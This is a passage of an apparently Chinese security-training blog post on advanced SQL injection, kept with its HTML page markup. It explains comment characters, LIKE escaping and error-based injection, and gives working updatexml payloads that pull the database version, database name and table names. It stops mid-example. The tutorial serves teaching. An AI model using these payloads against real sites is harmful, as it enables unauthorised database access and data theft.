@@ -1,0 +1,2447 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前置知识 注释符 --+\t(推荐使用)在GET请求中，+ 会被解析为空格，常用于URL注入 #\t(需URL编码)在GET请求中需编码为 %23，避免与前端锚点冲突 /**/\t(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字 LIKE语句和转义字符 LIKE语句 再MySQL中LIKE语句用于模糊查询，其基本格式就是\n">
+<title>1.22 sql注入进阶</title>
+
+<link rel='canonical' href='https://www.retr0.xyz/p/1.22-sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/'>
+
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.22 sql注入进阶">
+<meta property='og:description' content="前置知识 注释符 --+\t(推荐使用)在GET请求中，+ 会被解析为空格，常用于URL注入 #\t(需URL编码)在GET请求中需编码为 %23，避免与前端锚点冲突 /**/\t(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字 LIKE语句和转义字符 LIKE语句 再MySQL中LIKE语句用于模糊查询，其基本格式就是\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.22-sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/'>
+<meta property='og:site_name' content='Retr0的小窝'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-22T20:58:00&#43;08:00'/><meta property='article:modified_time' content='2026-01-22T20:58:00&#43;08:00'/>
+<meta name="twitter:title" content="1.22 sql注入进阶">
+<meta name="twitter:description" content="前置知识 注释符 --+\t(推荐使用)在GET请求中，+ 会被解析为空格，常用于URL注入 #\t(需URL编码)在GET请求中需编码为 %23，避免与前端锚点冲突 /**/\t(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字 LIKE语句和转义字符 LIKE语句 再MySQL中LIKE语句用于模糊查询，其基本格式就是\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+        <link rel="stylesheet" href="/css/APlayer.min.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_918ed7c4aecb3d05.gif" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🥳</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Retr0的小窝</a></h1>
+            <h2 class="site-description">我们安全了……暂时的</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/349466985'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:ded000@retr0.xyz'
+                        target="_blank"
+                        title="email"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/makabaka11'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.retr0.xyz/index.xml'
+                        target="_blank"
+                        title="RSS"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-rss"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0" /><path d="M4 4a16 16 0 0 1 16 16" /><path d="M4 11a9 9 0 0 1 9 9" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://t.me/ded0000'
+                        target="_blank"
+                        title="Telegram"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-telegram"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页 | Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E-about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于 | About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档 | Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/message/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-message"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 9h8" /><path d="M8 13h6" /><path d="M18 4a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-5l-5 3v-3h-2a3 3 0 0 1 -3 -3v-8a3 3 0 0 1 3 -3h12z" /></svg>
+                
+                <span>留言板 | Msg Board</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索 | Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>技术链接 | Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#注释符">注释符</a></li>
+    <li><a href="#like语句和转义字符">LIKE语句和转义字符</a>
+      <ol>
+        <li><a href="#like语句">LIKE语句</a></li>
+        <li><a href="#转义字符对照表">转义字符对照表</a></li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li><a href="#方法一xpath函数报错">方法一：XPath函数报错</a>
+      <ol>
+        <li><a href="#updatexml函数的定义">updatexml函数的定义</a></li>
+        <li><a href="#updatexml报错注入">updatexml报错注入</a></li>
+        <li><a href="#extractvalue函数">extractvalue()函数</a></li>
+      </ol>
+    </li>
+    <li><a href="#方法二count--group-by--floorrand2报错">方法二：count(*) + group by + floor(rand()*2)报错</a>
+      <ol>
+        <li><a href="#原理解释仅作了解">原理解释（仅作了解）</a>
+          <ol>
+            <li><a href="#前置知识-1"><strong>前置知识：</strong></a></li>
+            <li><a href="#按步骤还原报错过程">按步骤还原报错过程：</a></li>
+            <li><a href="#报错核心原因总结">报错核心原因总结</a></li>
+          </ol>
+        </li>
+        <li><a href="#使用方法">使用方法</a></li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li><a href="#核心函数">核心函数</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#小测验">小测验</a>
+      <ol>
+        <li><a href="#第一关">第一关</a></li>
+        <li><a href="#第二关">第二关</a></li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li><a href="#基本概念">基本概念</a></li>
+    <li><a href="#漏洞原理">漏洞原理</a></li>
+    <li><a href="#常见注入点">常见注入点</a></li>
+    <li><a href="#使用sqlmap注入">使用sqlmap注入</a>
+      <ol>
+        <li><a href="#前置准备抓取目标-http-请求包">前置准备：抓取目标 HTTP 请求包</a></li>
+        <li><a href="#核心操作步骤">核心操作步骤</a>
+          <ol>
+            <li><a href="#基础命令检测-http-头注入漏洞">基础命令（检测 HTTP 头注入漏洞）</a></li>
+            <li><a href="#布尔盲注最常用">布尔盲注（最常用）</a></li>
+            <li><a href="#时间盲注无页面响应差异时">时间盲注（无页面响应差异时）</a></li>
+            <li><a href="#提取数据">提取数据</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%BD%91%E5%AE%89/" style="background-color: #BEBDBD; color: #fff;">
+                网安
+            </a>
+        
+            <a href="/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/" >
+                26寒假集训
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/1.22-sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/">1.22 sql注入进阶</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+     
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-01-22</time>
+            </div>
+        
+
+        
+
+        
+        <div id="viewCount">
+            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
+            <time class="article-time--reading">
+                <span id="vercount_value_page_pv">loading... </span>次
+            </time>
+        </div>
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="前置知识">前置知识
+</h1><h2 id="注释符">注释符
+</h2><ol>
+<li><code>--+</code>	(推荐使用)在GET请求中，<code>+</code> 会被解析为空格，常用于URL注入</li>
+<li><code>#</code>		(需URL编码)在GET请求中需编码为 <code>%23</code>，避免与前端锚点冲突</li>
+<li><code>/**/</code>	(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字</li>
+</ol>
+<h2 id="like语句和转义字符">LIKE语句和转义字符
+</h2><h3 id="like语句">LIKE语句
+</h3><p>再MySQL中LIKE语句用于模糊查询，其基本格式就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="err">数据库名</span><span class="p">.</span><span class="err">数据表名</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="err">字段名</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%\匹配目标%&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>例如在一堆数据中查询包含<code>@</code>的数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">test</span><span class="p">.</span><span class="n">db1</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">pwd</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%\@%&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是因为一些字符的特殊性导致like语句的参数并不全都是<code>'%\匹配目标%'</code>那么简单，</p>
+<p>例如你要查询含有<code>\</code>的数据，参数就要填<code>'%\\\\%'</code>，详情见下文。</p>
+<h3 id="转义字符对照表">转义字符对照表
+</h3><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th><strong>转义序列</strong></th>
+          <th><strong>代表的字符</strong></th>
+          <th><strong>说明</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>\n</code></td>
+          <td>换行符（LF）</td>
+          <td>表示换行操作</td>
+      </tr>
+      <tr>
+          <td><code>\t</code></td>
+          <td>制表符（Tab）</td>
+          <td>表示横向制表</td>
+      </tr>
+      <tr>
+          <td><code>\r</code></td>
+          <td>回车符（CR）</td>
+          <td>表示回车操作</td>
+      </tr>
+      <tr>
+          <td><code>\b</code></td>
+          <td>退格符</td>
+          <td>表示删除前一个字符的操作</td>
+      </tr>
+      <tr>
+          <td><code>\0</code></td>
+          <td>NULL 字符</td>
+          <td>ASCII 0 字符，常用于字符串结束标记</td>
+      </tr>
+      <tr>
+          <td><code>\\</code></td>
+          <td>反斜杠 <code>\</code></td>
+          <td>表示反斜杠本身（字符串中直接写<code>\</code><br/>会被解析为转义符，需用<code>\\</code><br/>表示字面量）</td>
+      </tr>
+      <tr>
+          <td><code>\'</code></td>
+          <td>单引号 <code>'</code></td>
+          <td>表示单引号本身（避免与字符串的单引号边界冲突）</td>
+      </tr>
+      <tr>
+          <td><code>\&quot;</code></td>
+          <td>双引号 <code>&quot;</code></td>
+          <td>表示双引号本身（当 SQL 模式为<code>ANSI_QUOTES</code><br/>时，双引号可能被解析为标识符，需转义）</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>在 LIKE 查询中，<code>%</code>和<code>_</code>是通配符，若要匹配它们本身，必须额外转义。</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th><strong>目标字符</strong></th>
+          <th><strong>转义方式（默认）</strong></th>
+          <th><strong>转义方式（ESCAPE 自定义）</strong></th>
+          <th><strong>示例（默认转义）</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>%</code><br/>（百分号）</td>
+          <td><code>\%</code></td>
+          <td><code>#%</code><br/>（以<code>#</code><br/>为转义符）</td>
+          <td><code>LIKE '%\%%'</code></td>
+      </tr>
+      <tr>
+          <td><code>_</code><br/>（下划线）</td>
+          <td><code>\_</code></td>
+          <td><code>#_</code><br/>（以<code>#</code><br/>为转义符）</td>
+          <td><code>LIKE '%\_%'</code></td>
+      </tr>
+      <tr>
+          <td><code>\</code><br/>（反斜杠）</td>
+          <td><code>\\\\</code></td>
+          <td><code>#\</code><br/>（以<code>#</code><br/>为转义符）</td>
+          <td><code>LIKE '%\\\\%'</code></td>
+      </tr>
+  </tbody>
+</table></div>
+<p>🔍 <strong>注意：</strong></p>
+<ol>
+<li>反斜杠只转义紧跟其后的一个字符，所以<code>\%</code>只会把后面的<code>%</code>转义为普通字符，不会影响其他字符。</li>
+<li>在 LIKE 中，反斜杠本身需要 <strong>双重转义</strong> （<code>\\\\</code>），因为 MySQL 会先解析一次<code>\\</code>为<code>\</code>，然后 LIKE 再解析一次<code>\\</code>为<code>\</code>，最终得到一个字面量<code>\</code>。</li>
+</ol>
+<h1 id="order-by与联合查询注入">ORDER BY与联合查询注入
+</h1><p>这一部分在之前的文章已有讲述，详见<a class="link" href="https://www.retr0.xyz/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/"  target="_blank" rel="noopener"
+    >1.5 mysql注入初步</a></p>
+<p>仅补充一下<strong>注入测试位置</strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61753668/1769053085976-09eeb0d4-01ef-4c06-ad69-1c797878d930.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h1 id="报错注入">报错注入
+</h1><blockquote>
+<p>报错注入指利用错误信息回显获取数据库内容</p>
+<p>适用于页面无法正常回显查询内容，但会详细显示查询过程的错误信息时，可通过构造特殊SQL语句触发错误，将想要查询的数据通过错误信息带出。</p>
+</blockquote>
+<p>✅标准注入方法是（以单引号闭合为例）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">?id=1&#39; and (查询语句) --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="方法一xpath函数报错">方法一：XPath函数报错
+</h2><h3 id="updatexml函数的定义">updatexml函数的定义
+</h3><blockquote>
+<p><code>updatexml()</code>函数用于修改XML文档中的节点。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">updatexml</span><span class="p">(</span><span class="n">XML_document</span><span class="p">,</span><span class="w"> </span><span class="n">XPath_string</span><span class="p">,</span><span class="w"> </span><span class="n">new_value</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一个参数<code>XML_document</code>是XML文档对象的名称。</p>
+<p>第二个参数<code>XPath_string</code>是指定需要更新的XML节点的XPath表达式。</p>
+<p>第三个参数<code>new_value</code>是新值，用于替换找到的符合条件的数据。</p>
+<p>如果<code>XPath_string</code>格式错误，MySQL会抛出一个XPath语法错误。</p>
+<h3 id="updatexml报错注入">updatexml报错注入
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">version</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61753668/1769049937619-a4c8a200-92be-48c5-8e2a-2ba1cf1550ec.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>updatexml()函数的报错就是在第二参数上做文章，这里的<code>concat(0x7e,version(),0x7e)</code>试图通过concat()函数拼接一个字符串，version()函数返回当前数据库的名称。但是<code>0x7e</code>是一个十六进制值，代表的是ASCII字符<code>~</code>，通常不直接用于XPath表达式，这导致二个参数的XPath表达式格式不正确，引发函数报错。</p>
+<p>所以这里只要在concat()函数中构造我们要查询的SQL注入Payload就可以利用：</p>
+<p><strong>爆数据库版本信息：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>爆当前数据库名及表名：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>爆表字段信息：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
